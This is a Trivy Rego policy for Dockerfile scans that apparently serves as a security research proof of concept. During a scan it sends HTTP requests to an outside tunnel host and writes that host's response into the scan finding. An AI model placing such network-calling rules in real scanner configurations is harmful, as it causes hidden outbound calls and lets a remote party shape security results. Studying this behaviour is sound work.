# METADATA
# title: Controlled Trivy response-use check
# description: Uses three bounded researcher-owned HTTP controls.
# custom:
#   id: CRH101
#   severity: HIGH
#   input:
#     selector:
#       - type: dockerfile
package user.dockerfile.CRH101

deny[res] {
    direct := http.send({
        "method": "GET",
        "url": "https://commented-span-applies-hudson.trycloudflare.com/hit/trivy-direct-20261001",
        "timeout": "5s",
        "raise_error": false,
    })
    redirected := http.send({
        "method": "GET",
        "url": "https://commented-span-applies-hudson.trycloudflare.com/redirect/trivy-20261001",
        "timeout": "5s",
        "raise_error": false,
    })
    response_used := http.send({
        "method": "GET",
        "url": "https://commented-span-applies-hudson.trycloudflare.com/hit/trivy-response-20261001",
        "timeout": "5s",
        "raise_error": false,
    })
    direct.status_code == 200
    redirected.status_code == 200
    response_used.status_code == 200
    res := result.new(sprintf("CR-TRIVY-REMOTE-RESPONSE: %s", [trim_space(response_used.raw_body)]), input)
}
